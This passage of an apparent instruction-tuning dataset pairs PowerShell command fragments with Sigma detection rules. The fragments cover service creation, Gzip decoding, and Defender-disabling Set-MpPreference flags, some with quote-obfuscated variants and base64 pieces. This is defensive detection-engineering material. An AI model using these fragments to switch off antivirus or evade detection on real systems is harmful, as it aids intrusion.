administrator or user creates a service for legitimate reasons.\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "New-Service \\\"-Binary\\\"PathName", "output": "title: New Service Creation Using PowerShell\nid: c02e96b7-c63a-4c47-bd83-4a9f74afcfb2\nrelated:\n    - id: 85ff530b-261d-48c6-a441-facaa2e81e48 # Using Sc.EXE\n      type: similar\nstatus: test\ndescription: Detects the creation of a new service using powershell.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2023-02-20\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'New-Service'\n            - '-BinaryPathName'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reasons.\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "New-Service -BinaryPathName", "output": "title: New Service Creation Using PowerShell\nid: c02e96b7-c63a-4c47-bd83-4a9f74afcfb2\nrelated:\n    - id: 85ff530b-261d-48c6-a441-facaa2e81e48 # Using Sc.EXE\n      type: similar\nstatus: test\ndescription: Detects the creation of a new service using powershell.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md\nauthor: Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community\ndate: 2023-02-20\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'New-Service'\n            - '-BinaryPathName'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator or user creates a service for legitimate reasons.\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "GZipStream ::Decompress", "output": "title: Gzip Archive Decode Via PowerShell\nid: 98767d61-b2e8-4d71-b661-e36783ee24c1\nstatus: test\ndescription: Detects attempts of decoding encoded Gzip archives via PowerShell.\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.command-and-control\n    - attack.t1132.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'GZipStream'\n            - '::Decompress'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative scripts may use this functionality. Use \"ParentImage\" in combination with the script names and allowed users and applications to filter legitimate executions\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "GZipStream \\\"::Deco\\\"mpress", "output": "title: Gzip Archive Decode Via PowerShell\nid: 98767d61-b2e8-4d71-b661-e36783ee24c1\nstatus: test\ndescription: Detects attempts of decoding encoded Gzip archives via PowerShell.\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.command-and-control\n    - attack.t1132.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'GZipStream'\n            - '::Decompress'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative scripts may use this functionality. Use \"ParentImage\" in combination with the script names and allowed users and applications to filter legitimate executions\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "GZipStream ::Decompress", "output": "title: Gzip Archive Decode Via PowerShell\nid: 98767d61-b2e8-4d71-b661-e36783ee24c1\nstatus: test\ndescription: Detects attempts of decoding encoded Gzip archives via PowerShell.\nreferences:\n    - https://www.zscaler.com/blogs/security-research/onenote-growing-threat-malware-distribution\nauthor: Hieu Tran\ndate: 2023-03-13\ntags:\n    - attack.command-and-control\n    - attack.t1132.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'GZipStream'\n            - '::Decompress'\n    condition: selection\nfalsepositives:\n    - Legitimate administrative scripts may use this functionality. Use \"ParentImage\" in combination with the script names and allowed users and applications to filter legitimate executions\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Add-MpPreference Set-MpPreference DisableArchiveScanning DisableRealtimeMonitoring DisableIOAVProtection DisableBehaviorMonitoring DisableBlockAtFirstSeen DisableCatchupFullScan DisableCatchupQuickScan $true 1 RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAEYAdQBsAGwAUwBjAGEAbgA RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAFEAdQBpAGMAawBTAGMAYQBuAA RABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwA", "output": "title: Powershell Defender Disable Scan Feature\nid: 1ec65a5f-9473-4f12-97da-622044d6df21\nstatus: test\ndescription: Detects requests to disable Microsoft Defender features using PowerShell commands\nreferences:\n    - https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps\n    - https://www.virustotal.com/gui/file/d609799091731d83d75ec5d1f030571af20c45efeeb94840b67ea09a3283ab65/behavior/C2AE\n    - https://www.virustotal.com/gui/search/content%253A%2522Set-MpPreference%2520-Disable%2522/files\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-03\nmodified: 2024-01-02\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_cmdlet:\n        CommandLine|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    selection_cli_option:\n        CommandLine|contains:\n            - 'DisableArchiveScanning '\n            - 'DisableRealtimeMonitoring '\n            - 'DisableIOAVProtection '\n            - 'DisableBehaviorMonitoring '\n            - 'DisableBlockAtFirstSeen '\n            - 'DisableCatchupFullScan '\n            - 'DisableCatchupQuickScan '\n    selection_cli_value:\n        CommandLine|contains:\n            - '$true'\n            - ' 1 '\n    selection_encoded_modifier:\n        CommandLine|base64offset|contains:\n            # Note: Since this is calculating offsets casing is important\n            - 'disablearchivescanning '\n            - 'DisableArchiveScanning '\n            - 'disablebehaviormonitoring '\n            - 'DisableBehaviorMonitoring '\n            - 'disableblockatfirstseen '\n            - 'DisableBlockAtFirstSeen '\n            - 'disablecatchupfullscan '\n            - 'DisableCatchupFullScan '\n            - 'disablecatchupquickscan '\n            - 'DisableCatchupQuickScan '\n            - 'disableioavprotection '\n            - 'DisableIOAVProtection '\n            - 'disablerealtimemonitoring '\n            - 'DisableRealtimeMonitoring '\n    selection_encoded_direct:\n        CommandLine|contains:\n            - 'RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA'\n            - 'QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA'\n            - 'EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA'\n            - 'RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA'\n            - 'QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA'\n            - 'EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA'\n            - 'ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA'\n            - 'QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA'\n            - 'kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA'\n            - 'ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA'\n            - 'QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA'\n            - 'kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA'\n            - 'RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAEYAdQBsAGwAUwBjAGEAbgA'\n            - 'RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAFEAdQBpAGMAawBTAGMAYQBuAA'\n            - 'RABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwA'\n    condition: all of selection_cli_* or 1 of selection_encoded_*\nfalsepositives:\n    - Possible administrative activity\n    - Other Cmdlets that may use the same parameters\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Add-MpPreference Set-MpPreference DisableArchiveScanning \"D\"\"i\"\"s\"\"a\"\"b\"\"l\"\"e\"\"R\"\"e\"\"a\"\"l\"\"t\"\"i\"\"m\"\"e\"\"M\"\"o\"\"n\"\"i\"\"t\"\"o\"\"r\"\"i\"\"n\"\"g\" DisableIOAVProtection DisableBehaviorMonitoring DisableBlockAtFirstSeen DisableCatchupFullScan DisableCatchupQuickScan $true 1 RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAEYAdQBsAGwAUwBjAGEAbgA RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAFEAdQBpAGMAawBTAGMAYQBuAA RABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwA", "output": "title: Powershell Defender Disable Scan Feature\nid: 1ec65a5f-9473-4f12-97da-622044d6df21\nstatus: test\ndescription: Detects requests to disable Microsoft Defender features using PowerShell commands\nreferences:\n    - https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps\n    - https://www.virustotal.com/gui/file/d609799091731d83d75ec5d1f030571af20c45efeeb94840b67ea09a3283ab65/behavior/C2AE\n    - https://www.virustotal.com/gui/search/content%253A%2522Set-MpPreference%2520-Disable%2522/files\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-03\nmodified: 2024-01-02\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_cmdlet:\n        CommandLine|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    selection_cli_option:\n        CommandLine|contains:\n            - 'DisableArchiveScanning '\n            - 'DisableRealtimeMonitoring '\n            - 'DisableIOAVProtection '\n            - 'DisableBehaviorMonitoring '\n            - 'DisableBlockAtFirstSeen '\n            - 'DisableCatchupFullScan '\n            - 'DisableCatchupQuickScan '\n    selection_cli_value:\n        CommandLine|contains:\n            - '$true'\n            - ' 1 '\n    selection_encoded_modifier:\n        CommandLine|base64offset|contains:\n            # Note: Since this is calculating offsets casing is important\n            - 'disablearchivescanning '\n            - 'DisableArchiveScanning '\n            - 'disablebehaviormonitoring '\n            - 'DisableBehaviorMonitoring '\n            - 'disableblockatfirstseen '\n            - 'DisableBlockAtFirstSeen '\n            - 'disablecatchupfullscan '\n            - 'DisableCatchupFullScan '\n            - 'disablecatchupquickscan '\n            - 'DisableCatchupQuickScan '\n            - 'disableioavprotection '\n            - 'DisableIOAVProtection '\n            - 'disablerealtimemonitoring '\n            - 'DisableRealtimeMonitoring '\n    selection_encoded_direct:\n        CommandLine|contains:\n            - 'RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA'\n            - 'QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA'\n            - 'EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA'\n            - 'RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA'\n            - 'QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA'\n            - 'EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA'\n            - 'ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA'\n            - 'QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA'\n            - 'kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA'\n            - 'ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA'\n            - 'QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA'\n            - 'kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA'\n            - 'RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAEYAdQBsAGwAUwBjAGEAbgA'\n            - 'RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAFEAdQBpAGMAawBTAGMAYQBuAA'\n            - 'RABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwA'\n    condition: all of selection_cli_* or 1 of selection_encoded_*\nfalsepositives:\n    - Possible administrative activity\n    - Other Cmdlets that may use the same parameters\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Add-MpPreference Set-MpPreference DisableArchiveScanning DisableRealtimeMonitoring DisableIOAVProtection DisableBehaviorMonitoring DisableBlockAtFirstSeen DisableCatchupFullScan DisableCatchupQuickScan $true 1 RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAEYAdQBsAGwAUwBjAGEAbgA RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAFEAdQBpAGMAawBTAGMAYQBuAA RABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwA", "output": "title: Powershell Defender Disable Scan Feature\nid: 1ec65a5f-9473-4f12-97da-622044d6df21\nstatus: test\ndescription: Detects requests to disable Microsoft Defender features using PowerShell commands\nreferences:\n    - https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps\n    - https://www.virustotal.com/gui/file/d609799091731d83d75ec5d1f030571af20c45efeeb94840b67ea09a3283ab65/behavior/C2AE\n    - https://www.virustotal.com/gui/search/content%253A%2522Set-MpPreference%2520-Disable%2522/files\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-03\nmodified: 2024-01-02\ntags:\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cli_cmdlet:\n        CommandLine|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    selection_cli_option:\n        CommandLine|contains:\n            - 'DisableArchiveScanning '\n            - 'DisableRealtimeMonitoring '\n            - 'DisableIOAVProtection '\n            - 'DisableBehaviorMonitoring '\n            - 'DisableBlockAtFirstSeen '\n            - 'DisableCatchupFullScan '\n            - 'DisableCatchupQuickScan '\n    selection_cli_value:\n        CommandLine|contains:\n            - '$true'\n            - ' 1 '\n    selection_encoded_modifier:\n        CommandLine|base64offset|contains:\n            # Note: Since this is calculating offsets casing is important\n            - 'disablearchivescanning '\n            - 'DisableArchiveScanning '\n            - 'disablebehaviormonitoring '\n            - 'DisableBehaviorMonitoring '\n            - 'disableblockatfirstseen '\n            - 'DisableBlockAtFirstSeen '\n            - 'disablecatchupfullscan '\n            - 'DisableCatchupFullScan '\n            - 'disablecatchupquickscan '\n            - 'DisableCatchupQuickScan '\n            - 'disableioavprotection '\n            - 'DisableIOAVProtection '\n            - 'disablerealtimemonitoring '\n            - 'DisableRealtimeMonitoring '\n    selection_encoded_direct:\n        CommandLine|contains:\n            - 'RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 'EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA'\n            - 'RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA'\n            - 'QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA'\n            - 'EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA'\n            - 'RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA'\n            - 'QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA'\n            - 